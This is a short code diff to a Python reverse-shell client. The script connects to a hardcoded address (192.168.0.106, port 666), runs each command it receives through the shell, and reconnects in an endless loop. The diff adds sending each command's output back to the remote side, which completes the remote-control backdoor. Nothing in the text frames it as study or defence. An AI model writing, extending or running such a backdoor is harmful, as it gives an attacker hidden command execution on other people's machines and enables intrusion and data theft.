@@ -11,11 +11,12 @@ def netcat(hostname, port):
         data = s.recv(1024)
         if data == "":
             pass
-       
-        subprocess.call(data.decode(), shell=True)
+        else:
+            result = subprocess.check_output(data.decode(), shell=True)
+            s.send(result)
 
 while True:
 	try:
-		netcat("ip", port) # SUSTITUIR QUE OS VEO (-. -)zZz
+		netcat('192.168.0.106', 666)
 	except:
-		sleep(1)
+		sleep(10)
